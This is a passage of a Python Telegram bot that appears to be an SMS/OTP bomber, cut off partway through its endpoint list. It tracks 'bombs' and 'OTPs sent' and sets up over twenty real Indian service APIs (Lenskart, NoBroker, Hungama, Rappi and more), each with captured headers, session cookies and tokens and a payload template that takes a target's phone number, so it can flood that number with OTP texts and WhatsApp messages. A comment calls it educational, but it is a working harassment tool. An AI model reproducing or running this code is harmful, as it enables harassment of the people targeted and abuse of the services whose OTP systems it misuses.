import asyncio
import aiohttp
import time
import os
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes, ConversationHandler
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# ===== CONFIGURATION FROM ENV =====
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_USER_IDS = os.getenv("ADMIN_USER_IDS", "").split(",")
PORT = int(os.getenv("PORT", 8443))
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "")
ACCESS_CODE = os.getenv("ACCESS_CODE", "")  # NEW: Access code for bot usage

# Conversation state
WAITING_FOR_CODE = 1

# Store authorized users and stats
authorized_users = set()  # Users who entered correct access code
user_stats = {}  # Store stats per user: {user_id: {"bombs": 0, "authorized_at": datetime}}
global_stats = {
    "total_bombs": 0,
    "total_otps_sent": 0,
    "bot_started_at": datetime.now()
}

# Simplified API configs (5 APIs for educational purposes)
# API_CONFIGS = [
#     {
#         "name": "Lenskart",
#         "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
#         "method": "POST",
#         "headers": {
#             "Content-Type": "application/json",
#             "X-API-Client": "mobilesite",
#             "User-Agent": "Mozilla/5.0 (Linux; Android 13) Mobile Safari/537.36"
#         },
#         "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'
#     },
#     {
#         "name": "Stratzy",
#         "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
#         "method": "POST",
#         "headers": {
#             "Content-Type": "application/json",
#             "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
#         },
#         "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
#     },
#     {
#         "name": "Hungama",
#         "url": "https://communication.api.hungama.com/v1/communication/otp",
#         "method": "POST",
#         "headers": {
#             "Content-Type": "application/json",
#             "country_code": "IN",
#             "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
#         },
#         "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
#     },
#     {
#         "name": "Beepkart",
#         "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
#         "method": "POST",
#         "headers": {
#             "Content-Type": "application/json",
#             "appname": "Website",
#             "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
#         },
#         "data": lambda phone: f'{{"city":362,"fullName":"","phone":"{phone}","source":"myaccount"}}'
#     },
#     {
#         "name": "NoBroker",
#         "url": "https://www.nobroker.in/api/v3/account/otp/send",
#         "method": "POST",
#         "headers": {
#             "Content-Type": "application/x-www-form-urlencoded",
#             "User-Agent": "Mozilla/5.0 (Linux; Android 10) Mobile Safari/537.36"
#         },
#         "data": lambda phone: f"phone={phone}&countryCode=IN"
#     }
# ]

API_CONFIGS = [
    {
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "X-API-Client": "mobilesite",
            "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a",
            "X-Accept-Language": "en",
            "X-B3-TraceId": "991736185845136",
            "X-Country-Code": "IN",
            "X-Country-Code-Override": "IN",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Origin": "https://www.lenskart.com",
            "X-Requested-With": "pure.lite.browser",
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.lenskart.com/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
        },
        "data": lambda phone: f'{{"captcha":null,"phoneCode":"+91","telephone":"{phone}"}}'
    },
    {
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.gopinkcabs.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.gopinkcabs.com/app/cab/customer/step1.php",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Sec-CH-UA-Platform": "\"Android\"",
            "Sec-CH-UA": "\"Android WebView\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"",
            "Sec-CH-UA-Mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Cookie": "PHPSESSID=mor5basshemi72pl6d0bp21kso; mylocation=#"
        },
        "data": lambda phone: f"check_mobile_number=1&contact={phone}"
    },
    {
        "url": "https://www.shemaroome.com/users/resend_otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://www.shemaroome.com",
            "Referer": "https://www.shemaroome.com/users/sign_in",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36"
        },
        "data": lambda phone: f"mobile_no=%2B91{phone}"
    },
    {
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0",
        "method": "POST",
        "headers": {
            "content-length": lambda data: str(len(data)),
            "sec-ch-ua-platform": "\"Android\"",
            "cache": "no-store",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "x-channel-id": "WEB",
            "sec-ch-ua-mobile": "?1",
            "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "content-type": "application/json",
            "x-user-journey-id": "2fbdb12b-feb8-40f5-9fc7-7ce4660723ae",
            "accept": "*/*",
            "origin": "https://www.kpnfresh.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.kpnfresh.com/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"phone_number":{{"number":"{phone}","country_code":"+91"}}}}'
    },
    {
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        "method": "POST",
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "x-app-version": "3.2.6",
            "x-user-journey-id": "faf3393a-018e-4fb9-8aed-8c9a90300b88",
            "content-type": "application/json; charset=UTF-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}'
    },
    {
        "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-encoding": "gzip",
            "host": "api.bikefixup.com",
            "client": "app",
            "content-type": "application/json; charset=UTF-8",
            "user-agent": "Dart/3.6 (dart:io)"
        },
        "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}'
    },
    {
        "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "headers": {
            "Deviceid": "5df83c463f0ff8ff",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)",
            "Accept-Language": "en-US",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate"
        },
        "data": lambda phone: f'{{"phone":"{phone}","country_code":"+91"}}'
    },
    {
        "url": "https://stratzy.in/api/web/auth/sendPhoneOTP",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "accept": "*/*",
            "origin": "https://stratzy.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://stratzy.in/login",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073132.5.0.0",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "content-type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "accept": "*/*",
            "origin": "https://stratzy.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://stratzy.in/login",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie": "_fbp=fb.1.1745073074472.847987893655824745; _ga=GA1.1.2022915250.1745073078; _ga_TDMEH7B1D5=GS1.1.1745073077.1.1.1745073102.35.0.0",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"phoneNo":"{phone}"}}'
    },
    {
        "url": "https://wellacademy.in/store/api/numberLoginV2",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "\"Android\"",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "content-type": "application/json; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://wellacademy.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://wellacademy.in/store/",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cookie": "ci_session=9phtdg2os6f19dae6u8hkf3fnfthcu8e; _ga=GA1.1.229652925.1745073317; _ga_YCZKX9HKYC=GS1.1.1745073316.1.1.1745073316.0.0.0; _clck=rhb9ip%7C2%7Cfv7%7C0%7C1935; _clsk=kfjbpg%7C1745073319962%7C1%7C1%7Ch.clarity.ms%2Fcollect; cf_clearance=...; twk_idm_key=PjxT2Q-2-xzG4VIHJXn7V; twk_uuid_5f588625f0e7167d000eb093=%7B...%7D; TawkConnectionTime=0",
            "priority": "u=1, i"
        },
        "data": lambda phone: f'{{"contact_no":"{phone}"}}'
    },
    {
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "identifier": "home",
            "mlang": "en",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "alang": "en",
            "country_code": "IN",
            "vlang": "en",
            "origin": "https://www.hungama.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.hungama.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
    },
    {
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Infinix X671B Build/TP1A.220624.014)",
            "Host": "api.servetel.in",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Oauthtoken": "",
            "AppVersion": "245",
            "ApiVersion": "6.2.55",
            "DeviceType": "Android",
            "DeviceId": "44098bdebb2dc047",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "24",
            "Host": "merucabapp.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.9.0"
        },
        "data": lambda phone: f"mobile_number={phone}"
    },
    {
        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "\"Android\"",
            "changesorigin": "product-listingpage",
            "originid": "0",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "appname": "Website",
            "userid": "0",
            "origin": "https://www.beepkart.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.beepkart.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"city":362,"fullName":"","phone":"{phone}","source":"myaccount","location":"","leadSourceLang":"","platform":"","consent":false,"whatsappConsent":false,"blockNotification":false,"utmSource":"","utmCampaign":"","sessionInfo":{{"sessionInfo":{{"sessionId":"d25b5a3d-72b4-4cd7-b6cb-b926a70ca08b","userId":"0","sessionRawString":"pathname=/account/new-landing&source=myaccount","referrerUrl":"/app_login?pathname=/account/new-landing&source=myaccount"}},"deviceInfo":{{"deviceRawString":"cityId=362; screen=360x800; _gcl_au=1.1.771171092.1745234524; cityName=bangalore","device_token":"PjwHFhDUVgUGYrkW29b5lGdR0kTg4kaA","device_type":"Android"}}}}'
    },
    {
        "url": "https://lendingplate.com/api.php",
        "method": "POST",
        "headers": {
            "Host": "lendingplate.com",
            "Connection": "keep-alive",
            "Content-Length": "45",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://lendingplate.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://lendingplate.com/personal-loan",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "Cookie": "_fbp=fb.1.1745235455885.251422456376518259; _gcl_au=1.1.241418330.1745235457; _gid=GA1.2.593762244.1745235461; PHPSESSID=ed051a5ea7783741eacfd602c6a192d3; _ga=GA1.1.1324264906.1745235460; _ga_MZBRRWYESB=GS1.1.1745235460.1.1.1745235474.46.0.0; moe_uuid=370f7dae-9313-4d44-8e38-efe54c437df8; _ga_KVRZ90DE3T=GS1.1.1745235460.1.1.1745235496.24.0.0"
        },
        "data": lambda phone: f"mobiles={phone}&resend=Resend&clickcount=3"
    },
    {
        "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "client-id": "snitch_secret",
            "Accept-Headers": "application/json",
            "Origin": "https://www.snitch.com",
            "Sec-Fetch-Site": "cross-site",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://www.snitch.com/",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}'
    },
    {
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "Content-Length": "61",
            "sec-ch-ua-platform": "\"Android\"",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://ekyc.daycoindia.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://ekyc.daycoindia.com/verify_otp.php",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "Cookie": "_ga_E8YSD34SG2=GS1.1.1745236629.1.0.1745236629.60.0.0; _ga=GA1.1.1156483287.1745236629; _clck=hy49vg%7C2%7Cfv9%7C0%7C1937; PHPSESSID=tbt45qc065ng0cotka6aql88sm; _clsk=1oia3yt%7C1745236688928%7C3%7C1%7Cu.clarity.ms%2Fcollect",
            "Priority": "u=1, i"
        },
        "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp"
    },
    {
        "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
        "method": "POST",
        "headers": {
            "content-type": "application/json; charset=utf-8",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.9.1"
        },
        "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}'
    },
    {
        "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
        "method": "POST",
        "headers": {
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://otpless.com",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://otpless.com/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
        },
        "data": lambda phone: f'{{"loginUri":"https://otpless.com/appid/0BMO1A04TAKEKDFR46DA?sdkPlatform=SHOPIFY&redirect_uri=https://imagineonline.store/account/login","origin":"https://otpless.com","deviceInfo":"{{\\"userAgent\\":\\"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36\\",\\"platform\\":\\"Linux armv81\\",\\"vendor\\":\\"Google Inc.\\",\\"browser\\":\\"Chrome\\",\\"connection\\":\\"4g\\",\\"language\\":\\"en-IN\\",\\"cookieEnabled\\":true,\\"screenWidth\\":360,\\"screenHeight\\":800,\\"screenColorDepth\\":24,\\"devicePixelRatio\\":3,\\"timezoneOffset\\":-330,\\"cpuArchitecture\\":\\"8-core\\",\\"fontFamily\\":\\"\\\\\\"Times New Roman\\\\\\"\\",\\"cHash\\":\\"82c029dd209dc895ed5cdbe212c5d67a50d3aadc918ecd24a3d06744b2e8e1f1\\"}}","browser":"Chrome","sdkPlatform":"SHOPIFY","platform":"Android","isLoginPage":true,"fingerprintJs":"{{\\"visitorId\\":\\"3bd3e9c36b55052f8c6aa470a1b7f1f7\\",\\"version\\":\\"4.6.1\\",\\"confidence\\":{{\\"score\\":0.4,\\"comment\\":\\"0.994 if upgrade to Pro: https://fpjs.dev/pro\\"}}}}","channel":"OTP","silentAuthEnabled":false,"triggerWebauthn":true,"mobile":"{phone}","value":"7029364131","selectedCountryCode":"+91","recaptchaToken":"YourRecaptchaTokenHere"}}'
    },
    {
        "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
        "method": "POST",
        "headers": {
            "sec-ch-ua-platform": "Android",
            "viewport-width": "360",
            "ect": "4g",
            "device-memory": "8",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "dpr": "3",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.myimaginestore.com",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.myimaginestore.com/?srsltid=AfmBOorMjDyyPK614cwQ_BYW58QCQwqGy2z3CU1dNnWF-NnvMwFcpOgA",
            "accept-encoding": "gzip, deflate, br, zstd",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "Cookie": "PHPSESSID=8trla61rg1ong40jfipnbkgbo2; searchReport-log=0; n7HDToken=d+IZAKbE68OGf8+MM3jp90Mh6Q7BsnSBnMQErzL+ViPGD2mROvGr8S/f/qo7gEEdKNx/7TbxOIKo/VLu3jyj1plDFiAxE5Gc3j24XaWSb7MUbgXOEq+MYK8gnkV3fuQb9nQEzNtrCfWu17tUGSJnbWaPF4OVHNTvPbpwT5KFt1Y=; _fbp=fb.1.1745237999949.310699470488280662; _gcl_au=1.1.1379491012.1745238000; form_key=BGrEvqqhl0ydIR8q; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; _ga=GA1.2.1310867166.1745238001; _gid=GA1.2.1539797096.1745238002; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; twk_idm_key=2gFbbj1GW6XCnip5ilOxx; TawkConnectionTime=0; _ga_GQ7J3T0PJB=GS1.1.1745238000.1.1.1745238019.41.0.0; private_content_version=e5dc03e8bc555ce39375a87c1f3e5089; section_data_ids=%7B%22cart%22%3A1745238010%2C%22customer%22%3A1745238010%2C%22compare-products%22%3A1745238010%2C%22last-ordered-items%22%3A1745238010%2C%22directory-data%22%3A1745238010%2C%22captcha%22%3A1745238010%2C%22instant-purchase%22%3A1745238010%2C%22loggedAsCustomer%22%3A1745238010%2C%22persistent%22%3A1745238010%2C%22review%22%3A1745238010%2C%22wishlist%22%3A1745238010%2C%22ammessages%22%3A1745238010%2C%22bss-fbpixel-atc%22%3A1745238010%2C%22bss-fbpixel-subscribe%22%3A1745238010%2C%22chatData%22%3A1745238010%2C%22recently_viewed_product%22%3A1745238010%2C%22recently_compared_product%22%3A1745238010%2C%22product_data_storage%22%3A1745238010%7D"
        },
        "data": lambda phone: f"mobile={phone}"
    },
    {
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "headers": {
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/x-www-form-urlencoded",
            "sec-ch-ua-platform": "Android",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
            "sec-ch-ua-mobile": "?1",
            "baggage": "sentry-environment=production,sentry-release=02102023,sentry-public_key=826f347c1aa641b6a323678bf8f6290b,sentry-trace_id=2a1cf434a30d4d3189d50a0751921996",
            "sentry-trace": "2a1cf434a30d4d3189d50a0751921996-9a2517ad5ff86454",
            "origin": "https://www.nobroker.in",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://www.nobroker.in/",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6",
            "priority": "u=1, i",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Cookie": "cloudfront-viewer-address=2001%3A4860%3A7%3A508%3A%3Aef%3A33486; cloudfront-viewer-country=MY; cloudfront-viewer-latitude=2.50000; cloudfront-viewer-longitude=112.50000; headerFalse=false; isMobile=true; deviceType=android; js_enabled=true; nbcr=bangalore; nbpt=RENT; nbSource=www.google.com; nbMedium=organic; nbCampaign=https%3A%2F%2Fwww.google.com%2F; nb_swagger=%7B%22app_install_banner%22%3A%22bannerB%22%7D; _gcl_au=1.1.1907920311.1745238224; _gid=GA1.2.1607866815.1745238224; _ga=GA1.2.777875435.1745238224; nbAppBanner=close; cto_bundle=jK9TOl9FUzhIa2t2MUElMkIzSW1pJTJCVnBOMXJyNkRSSTlkRzZvQUU0MEpzRXdEbU5ySkI0NkJOZmUlMkZyZUtmcjU5d214YkpCMTZQdTJDb1I2cWVEN2FnbWhIbU9oY09xYnVtc2VhV2J0JTJCWiUyQjl2clpMRGpQaVFoRWREUzdyejJTdlZKOEhFZ2Zmb2JXRFRyakJQVmRNaFp2OG5YVHFnJTNEJTNE; _fbp=fb.1.1745238225639.985270044964203739; moe_uuid=901076a7-33b8-42a8-a897-2ef3cde39273; _ga_BS11V183V6=GS1.1.1745238224.1.1.1745238241.0.0.0; _ga_STLR7BLZQN=GS1.1.1745238224.1.1.1745238241.0.0.0; mbTrackID=b9cc4f8434124733b01c392af03e9a51; nbDevice=mobile; nbccc=21c801923a9a4d239d7a05bc58fcbc57; JSESSION=5056e202-0da2-4ce9-8789-d4fe791a551c; _gat_UA-46762303-1=1; _ga_SQ9H8YK20V=GS1.1.1745238224.1.1.1745238326.18.0.1658024385"
        },
        "data": lambda phone: f"phone={phone}&countryCode=IN"
    },
    {
        "url": "https://www.cossouq.com/mobilelogin/otp/send",
        "method": "POST",
        "headers": {
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Content-Type": "application/x-www-form-urlencoded",
            "sec-ch-ua-platform": "Android",
            "x-requested-with": "XMLHttpRequest",
            "sec-ch-ua": "\"Google Chrome\";v=\"135\", \"Not-A.Brand\";v=\"8\", \"Chromium\";v=\"135\"",
